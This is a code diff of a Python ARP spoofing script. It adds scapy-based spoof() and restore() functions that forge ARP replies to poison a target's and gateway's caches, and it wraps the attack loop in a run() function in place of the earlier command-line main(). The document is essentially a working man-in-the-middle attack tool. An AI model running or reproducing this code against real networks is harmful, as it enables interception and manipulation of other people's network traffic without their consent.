@@ -1,26 +1,25 @@
 #!/usr/bin/env python
 
 import optparse 
-import scapy.all as scapy
 import time
 import sys
 
-from lib.arp_spoof import *
+from mac import * 
 
-def get_arguments():
-    parser = optparse.OptionParser()
-    parser.add_option("-g", "--gateway", dest = "gateway", help = "IP gateway")
-    parser.add_option("-t", "--target", dest = "target", help = "IP target")
-    (options, arguments) = parser.parse_args()
+def spoof(target_ip, spoof_ip):
+    print(target_ip)
+    target_mac = get_mac(target_ip)
+    packet = scapy.ARP(op = 2, pdst = target_ip, hwdst = target_mac, psrc = spoof_ip)
+    scapy.send(packet, verbose = False)
 
-    return options
+def restore(destination_ip, source_ip):
+    destination_mac = get_mac(destination_ip)
+    source_mac = get_mac(source_ip)
+    packet = scapy.ARP(op = 2, pdst = destination_ip, hwdst = destination_mac, psrc = source_ip, hwsrc = source_mac)
+    scapy.send(packet, count = 4, verbose = False)
 
-def main():
-    args = get_arguments()
 
-    target = args.target
-    gateway = args.gateway
-
+def run(target,gateway):
     sent_packets_count = 0
 
     try:
@@ -38,5 +37,3 @@ def main():
         print("\n[+] Detected CTRL + C ......... Resetting ARP tables..... Please wait......")
         restore(target, gateway)
         restore(gateway, target)
-
-main()
